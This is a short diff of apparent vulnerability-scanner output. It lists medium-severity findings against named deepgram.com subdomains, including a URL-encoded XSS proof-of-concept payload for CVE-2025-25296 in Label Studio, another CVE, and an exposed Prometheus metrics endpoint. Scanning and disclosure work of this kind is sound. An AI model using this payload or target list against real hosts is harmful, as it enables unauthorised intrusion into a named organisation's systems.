@@ -1,0 +1,3 @@
+[CVE-2025-25296] [http] [medium] https://labelstudio.deepgram.com/projects/upload-example/?label_config=%3CView%3E%3C!--%20%7B%22data%22%3A%20%7B%22text%22%3A%20%22%3Cdiv%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E%3C%2Fdiv%3E%22%7D%7D%20--%3E%3CHyperText%20name%3D%22text%22%20value%3D%22%24text%22%2F%3E%3C%2FView%3E
+[CVE-2025-47783] [http] [medium] https://labelstudio.deepgram.com/projects/upload-example/
+[prometheus-metrics] [http] [medium] https://lowstep.deepgram.com/metrics
